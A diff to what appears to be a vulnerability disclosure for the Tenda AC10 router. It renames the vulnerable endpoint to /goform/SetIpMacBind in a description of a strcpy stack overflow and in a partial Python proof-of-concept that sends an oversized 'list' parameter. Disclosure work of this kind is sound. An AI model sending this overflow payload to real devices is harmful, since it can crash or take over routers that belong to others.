@@ -16,7 +16,7 @@
 
 ![](https://github.com/z1r00/IOT_Vul/blob/main/Tenda/AC10/fromSetIpMacBind/img/2.png)
 
-/goform/fromSetIpMacBind, The static_list is controllable, it will assign the value to the list, and finally use strcpy to copy the list to mib_buf. It is worth noting that there is no size check, which leads to a stack overflow vulnerability
+/goform/SetIpMacBind, The static_list is controllable, it will assign the value to the list, and finally use strcpy to copy the list to mib_buf. It is worth noting that there is no size check, which leads to a stack overflow vulnerability
 
 ## Poc
 
@@ -39,7 +39,7 @@ rn = b'\r\n'
 p1 = b'a' * 0x1000
 p2 = b'list=' + p1
 
-p3 = b"POST /goform/fromSetIpMacBind" + b" HTTP/1.1" + rn
+p3 = b"POST /goform/SetIpMacBind" + b" HTTP/1.1" + rn
 p3 += b"Host: 192.168.0.1" + rn
 p3 += b"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0" + rn
 p3 += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
